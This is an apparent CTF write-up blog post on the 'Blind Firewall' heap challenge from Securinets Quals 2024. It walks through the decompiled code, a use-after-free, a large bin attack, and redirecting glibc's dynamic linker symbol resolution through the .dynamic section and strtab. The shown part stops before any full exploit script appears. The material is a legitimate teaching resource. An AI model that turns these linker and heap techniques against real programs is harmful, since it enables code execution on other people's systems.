<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="shortcut icon" href="assets/images/luffy.jpg" sizes="any">
    <link rel="icon" href="assets/images/luffy.jpg" type="image/svg+xml">
    <link rel="stylesheet" href="/assets/styles/global.css">
    <title>Blind Firewall | Securinets Quals 2024 | Buddurid's blog</title>

    <!-- SEO Metadata -->
    <meta property="og:title" content="Blind Firewall | Securinets Quals 2024 | Buddurid's blog" />
    <meta property="og:site_name" content="Buddurid's blog" />
    <meta property="description" content="heap challenge" />
    <meta property="og:description" content="heap challenge" />
    <meta property="og:type" content="website">
    <meta property="og:image" content="http://localhost:4000/assets/images/luffy.jpg">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="theme-color" content="#FFBD3F" />
    <link rel="canonical" href="http://localhost:4000/2024/10/15/Securinets-Quals-2024" />

    <!-- KaTeX -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">

</head>
<body><div class="load" id="load">
    <pre class="term" id="term">buddurid@CTF:~$ </pre>
    <script src="/assets/splashscreen.js"></script>
</div><nav class="open">
    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
    </div>
    <ul>
        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
                <a href="/"
                   title="Me">Me</a>
            </li><li style="z-index: 1;">
                <a href="/blog"
                   title="Blog"highlighted>Blog</a>
            </li><li >
                <a href="/ctfs"
                   title="CTFs">CTFs</a>
            </li></ul>

</nav>

<div class="nav-toggle hamburger-container">
    <div class="hamburger-button"></div>
</div>


<script>
    const responsiveNavThreshold = 500;
    const navOpener = document.querySelector('.nav-toggle');
    const nav = document.querySelector('nav');

    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);

    navOpener.addEventListener('click', () => {
        toggle(nav.classList, 'open');
    });

    let enabled = false;

    const setResponsive = () => {
        if (window.innerWidth < responsiveNavThreshold) {
            if (enabled) return;
            enabled = true;
            nav.classList.remove('open');
            navOpener.classList.add('enabled');
        }
        else {
            if (!enabled) return;
            enabled = false;
            nav.classList.add('open');
            navOpener.classList.remove('enabled');
        }
    };
    setResponsive();
    window.addEventListener('resize', setResponsive);
</script>
<div class="content">
            <main>
                <article>
    <h1 class="post-title">Blind Firewall | Securinets Quals 2024</h1>
    <p class="post-author-date"><b></b><em> - October 15, 2024</em></p>


    <div class="tags">

        <strong>Categories: </strong>

        
        <span>pwn</span>
        
        <span>heap</span>
        
        <span>linker</span>
        
        <span>leakless</span>
        

    </div>

    <p><i>heap challenge</i></p>

    <hr>

    <p>this is a heap challenge that ended with 1 solve and i had the pleasure to first blood it . the challenge runs on libc 2.35 which means its a modern heap exploit .</p>

<p>lets check the protections on the binary .</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
</code></pre></div></div>

<p>Everything seems in place except for that <code class="language-plaintext highlighter-rouge">Partial Relro</code> . We will come back to it later .</p>

<p>now lets break down the program .</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"Your ID: %d/n"</span><span class="p">,</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">puts</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">menu</span><span class="p">();</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">add_rule</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">edit_rule</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
        <span class="n">delete_rule</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
        <span class="n">show_rule</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
        <span class="n">copy_rule</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">6</span><span class="p">:</span>
        <span class="n">link_rules</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">7</span><span class="p">:</span>
        <span class="n">setup_in_data</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">8</span><span class="p">:</span>
        <span class="n">setup_out_data</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="nl">default:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">9</span> <span class="p">)</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>lets start by the first leak , which is the 4th lower nibble of the puts function . With good math we can deduce the first 2 bytes of the libc base address . this leak gives us a hint that we might need to brute force later and the author gave us this leak so we take it easy on the servers xD .</p>

<p>aside from that , looks like your usual heap menu with extra functions . We cool ? no . lets take down the show function xD</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">show_rule</span><span class="p">()</span>
<span class="p">{</span>
  <span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>actually after this printf instruction , your program will not see the light and not a single character will be printed . this takes away an attack vector which is <code class="language-plaintext highlighter-rouge">FSOP to stdout for leak into RCE</code> . lets continue .</p>

<h2 id="add_rule">add_rule()</h2>

<ul>
  <li>we have 11 chunks , although the array size is of size 10 , and the last pointer is in the sizes array , it doesnt matter because we can already overflow into other chunks as we will see .</li>
  <li>we can only allocate betwenn 0x4ff and 0x800 , so no tcache xD . which only leaves with large bins attaque and maybe some backwards/forwards consolidations attaque .</li>
  <li>size is saved in an array and no obvious overflows</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">1279</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="mi">2048</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">32LL</span><span class="p">);</span>
      <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
      <span class="n">qword_40C8</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">32</span><span class="p">;</span><span class="n">s</span>
      <span class="n">sizes</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

</code></pre></div></div>

<h2 id="delete_rule">delete_rule()</h2>

<ul>
  <li>neither the pointer for the chunks nor its size were cleared from the arrays »»&gt; UAF .</li>
  <li>no OOB , so no weird freeings random pointers .</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="p">)</span>
    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">));</span>

</code></pre></div></div>

<h2 id="edit_rule">edit_rule()</h2>

<ul>
  <li>the pointer we write into is malloc()+0x20 which is useless for our UAF as it doesnt write any metadata .</li>
  <li>might be of use later (i know it is , just dont wanna spoil xD)</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="p">)</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">qword_40C8</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">],</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sizes</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
</code></pre></div></div>

<h2 id="copy_rule">copy_rule()</h2>

<ul>
  <li>very weird function , not only useless because we copy into malloc()+0x20 which is useless , also because we can already write to both of them .</li>
  <li>we will need this later .</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">!=</span> <span class="n">v1</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">)</span> <span class="p">)</span>
      <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">qword_40C8</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">],</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">qword_40C8</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">],</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sizes</span><span class="p">[</span><span class="n">v2</span><span class="p">]);</span>
  <span class="p">}</span>

</code></pre></div></div>

<h2 id="link_rules">link_rules()</h2>

<ul>
  <li>we copy the first value of a rule ( pointer[0] ) into the 4th value ( pointer[3] ) . this confirms our large bin attaque vector</li>
  <li>usually the pointer[3] that we overwrite for the large bin attaque is a heap pointer which is useless . we can solve that by replacing it with a libc value from pointer[0] or pointer[1] with this function .</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="mh">0xA</span> <span class="p">)</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v2</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24LL</span><span class="p">)</span> <span class="o">=</span> <span class="o">**</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">);</span>
  <span class="p">}</span>

</code></pre></div></div>

<h2 id="setup_in_data-and-setup_out_data">setup_in_data() and setup_out_data()</h2>

<ul>
  <li>0 &lt;= v1 &lt;4 . which means we can partially overwrite our pointers seperately .</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rules</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">),</span> <span class="mi">8uLL</span><span class="p">);</span>
</code></pre></div></div>

<h1 id="recap">RECAP</h1>

<ol>
  <li>its nearly impossible to get a leak , of any kind.</li>
  <li>we cannot allocate into tcache nor fast nor small bins : 0x500&lt;= size &lt;=0x800</li>
  <li>window for large bin attaque confirmed and with libc pointer that we can partially overwrite and be put in <code class="language-plaintext highlighter-rouge">bk_nextsize</code> . for more reading on large bin attacks if youre not familiar with it . <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/large_bin_attack.c">how2heap</a></li>
  <li>we have full write on a chunk using both : edit , setup_in_data() and setup_out_data() .</li>
  <li>we have the 2 lowers bytes of libc.address so that makes partial writing easier and not brute-forceable for close to libc pointers.</li>
</ol>

<p>we are done with recon , so now we need to choose a good target for our large bin attaque</p>

<h1 id="exploitation">EXPLOITATION</h1>

<p>for some reason , at least from what i see , there still hasnt been a reliable target , that when overwritten with heap value like in our case , can be chained into an RCE primitive . here are some targets i saw in past CTF’s :</p>

<ul>
  <li>
    <p>printf_arginfo_table and printf_function_table like in <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">house of husk</a> . but this needs to be paired with a good one_gadget (not the case ) and printf(“%someformat”) to begin with xD . PASS .</p>
  </li>
  <li>
    <p>global_max_fast . its still viable in 2.35 as the value is still considered as long (in recent version it’s a byte ) . This one looked promising in the start as we can juggle pointers around and partially overwrite them , and the restriction on the size when allocating will be useless as all chunks will be considered as fast bin chunks . it was all fun until i stumbled on the fact that even the fd_pointer in fast bins are protected by safe linking xD (the pointered are XORed) .</p>
  </li>
  <li>
    <p>writing into tcache_per_thread struct in the TLS . this would be useless as no tcache size is allocated .</p>
  </li>
</ul>

<p>at this point i run out of ideas and i questionned my existence . but somehow i remembered that the author Mongi , who is my friend irl , loves the linker - for some reason xD - , and it wasnt long ago that i figured out that the offset between the ld.so base and the libc.so is fixed (depends on the filesystem) . if it doesnt work remotely its most likely because the patchelf (whether you run it manually or using pwninit) fucks that up . you can install gdb in the docker and get that offset . And just like that a new map has been unlocked .</p>

<p>I’ve been familiar with some linker exploitation , mostly with playing around with exit handlers pointers and some <code class="language-plaintext highlighter-rouge">DT_FINI</code> <code class="language-plaintext highlighter-rouge">FINI_ARRAY</code> shit … i also new about the <code class="language-plaintext highlighter-rouge">link_map</code> structures in the linker and their roles . these structs are mostly used for example when <strong>our binary wants to resolve a libc function</strong> . how useless ! now hold on a second , did you just say resolving functions ? when our binary is <code class="language-plaintext highlighter-rouge">Partial Relro</code> ??? thats when it clicked and i knew i was in the right path (at least the intended one xD) .</p>

<p>lets take a quick stepback and understand the resolving process . For <em>Partial Relro</em> , the function is resolved from libc when it is first called (in full relro it is done at startup ) . This process is done via the PLT stub that behind the scenes just calls the <code class="language-plaintext highlighter-rouge">_dl_fixup</code> function . so lets take a quick look at it . I’m just keeping the interesting parts .</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">_dl_fixup</span> <span class="p">(</span>
<span class="cp"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
</span>	   <span class="n">ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><span class="p">,</span>
<span class="cp"># endif
</span>	   <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">){</span>
  <span class="p">...</span>

  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="k">const</span> <span class="n">symtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_SYMTAB</span><span class="p">]);</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span>
  <span class="k">const</span> <span class="kt">uintptr_t</span> <span class="n">pltgot</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_PLTGOT</span><span class="p">]);</span>
  <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span>
    <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span>
		      <span class="o">+</span> <span class="n">reloc_offset</span> <span class="p">(</span><span class="n">pltgot</span><span class="p">,</span> <span class="n">reloc_arg</span><span class="p">));</span>
  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">refsym</span> <span class="o">=</span> <span class="n">sym</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="k">const</span> <span class="n">rel_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_offset</span><span class="p">);</span>

  <span class="p">...</span>

</code></pre></div></div>

<p>if you are familiar with the ret2dlresolve technique , then you might already be familiar with this piece of code . If not , this <a href="https://syst3mfailure.io/ret2dl_resolve/">ret2dlresolve</a> might make an interesting read .
For the sake of this writeup , i’ll just explain what is necessary . Well , the _dl_fixup resolves the right function based on strings . yes strings !!!! when it wants to resolve the function ‘system’ there is string somewhere thats has ‘system’ that will decide that that function will be resolved .</p>

<p>all the code in the _dl_fixup is trying to locate the position of the right string of the function in this section that is called <code class="language-plaintext highlighter-rouge">.dynstr</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">info</span> <span class="n">files</span>
<span class="n">Symbols</span> <span class="k">from</span> <span class="s">"/home/kali/Desktop/CTFs/quals_2024/pwn/blind_firewall/player/main"</span><span class="p">.</span>
<span class="n">Local</span> <span class="k">exec</span> <span class="nb">file</span><span class="p">:</span>
        <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">quals_2024</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">blind_firewall</span><span class="o">/</span><span class="n">player</span><span class="o">/</span><span class="n">main</span><span class="s">', file type elf64-x86-64.
        Entry point: 0x1170
        0x0000000000000318 - 0x0000000000000334 is .interp
        0x0000000000000338 - 0x0000000000000368 is .note.gnu.property
        0x0000000000000368 - 0x000000000000038c is .note.gnu.build-id
        0x000000000000038c - 0x00000000000003ac is .note.ABI-tag
        0x00000000000003b0 - 0x00000000000003e8 is .gnu.hash
        0x00000000000003e8 - 0x00000000000005b0 is .dynsym
        0x00000000000005b0 - 0x00000000000006b2 is .dynstr
        0x00000000000006b2 - 0x00000000000006d8 is .gnu.version
        0x00000000000006d8 - 0x0000000000000728 is .gnu.version_r
        0x0000000000000728 - 0x0000000000000848 is .rela.dyn
        0x0000000000000848 - 0x0000000000000920 is .rela.plt
        0x0000000000001000 - 0x000000000000101b is .init
        0x0000000000001020 - 0x00000000000010c0 is .plt
        0x00000000000010c0 - 0x00000000000010e0 is .plt.got
        0x00000000000010e0 - 0x0000000000001170 is .plt.sec
        0x0000000000001170 - 0x0000000000001a4e is .text
        0x0000000000001a50 - 0x0000000000001a5d is .fini
        0x0000000000002000 - 0x00000000000020e8 is .rodata
        0x00000000000020e8 - 0x0000000000002174 is .eh_frame_hdr
        0x0000000000002178 - 0x0000000000002380 is .eh_frame
        0x0000000000003de0 - 0x0000000000003de8 is .init_array
        0x0000000000003de8 - 0x0000000000003df0 is .fini_array
        0x0000000000003df0 - 0x0000000000003fd0 is .dynamic
        0x0000000000003fd0 - 0x0000000000004000 is .got
        0x0000000000004000 - 0x0000000000004060 is .got.plt
        0x0000000000004060 - 0x0000000000004070 is .data
        0x0000000000004080 - 0x0000000000004188 is .bss
gef➤  x/20s 0x00000000000005b0
0x5b0:  ""
0x5b1:  "__cxa_finalize"
0x5c0:  "read"
0x5c5:  "malloc"
0x5cc:  "__libc_start_main"
0x5de:  "setvbuf"
0x5e6:  "stdout"
0x5ed:  "puts"
0x5f2:  "free"
0x5f7:  "strncpy"
0x5ff:  "stdin"
0x605:  "__isoc99_scanf"
0x614:  "stderr"
0x61b:  "exit"
0x620:  "__stack_chk_fail"
0x631:  "printf"
0x638:  "libc.so.6"
0x642:  "GLIBC_2.7"
0x64c:  "GLIBC_2.4"
0x656:  "GLIBC_2.34"

</span></code></pre></div></div>

<p>Usually , the section is r - - . So we cant overwrite for example the string ‘printf’ with ‘system .</p>

<p>well if you dive into the macros you will realise that the binary doesnt keep a straight-forward pointer to this <em>strtab</em> section , it gets it from the <em>.dynamic</em> section
For quick recap , the .dynamic holds either pointers or offsets to every section in the shared object (in our case the binary itself) , like got , got.plt , dynstr , …..</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x00005555555545b0</span> <span class="o">-</span> <span class="mh">0x00005555555546b2</span> <span class="ow">is</span> <span class="p">.</span><span class="n">dynstr</span>
<span class="p">...</span>
<span class="mh">0x0000555555557df0</span> <span class="o">-</span> <span class="mh">0x0000555555557fd0</span> <span class="ow">is</span> <span class="p">.</span><span class="n">dynamic</span>
<span class="p">...</span>

<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">gx</span> <span class="mh">0x0000555555557df0</span>
<span class="mh">0x555555557df0</span><span class="p">:</span> <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000088</span>
<span class="mh">0x555555557e00</span><span class="p">:</span> <span class="mh">0x000000000000000c</span>      <span class="mh">0x0000000000001000</span>
<span class="mh">0x555555557e10</span><span class="p">:</span> <span class="mh">0x000000000000000d</span>      <span class="mh">0x0000000000001a50</span>
<span class="mh">0x555555557e20</span><span class="p">:</span> <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000003de0</span>
<span class="mh">0x555555557e30</span><span class="p">:</span> <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x555555557e40</span><span class="p">:</span> <span class="mh">0x000000000000001a</span>      <span class="mh">0x0000000000003de8</span>
<span class="mh">0x555555557e50</span><span class="p">:</span> <span class="mh">0x000000000000001c</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x555555557e60</span><span class="p">:</span> <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00005555555543b0</span>
<span class="mh">0x555555557e70</span><span class="p">:</span> <span class="mh">0x0000000000000005</span>      <span class="mh">0x00005555555545b0</span>
<span class="mh">0x555555557e80</span><span class="p">:</span> <span class="mh">0x0000000000000006</span>      <span class="mh">0x00005555555543e8</span>
<span class="mh">0x555555557e90</span><span class="p">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000102</span>
<span class="mh">0x555555557ea0</span><span class="p">:</span> <span class="mh">0x000000000000000b</span>      <span class="mh">0x0000000000000018</span>
<span class="mh">0x555555557eb0</span><span class="p">:</span> <span class="mh">0x0000000000000015</span>      <span class="mh">0x00007ffff7ffe108</span>
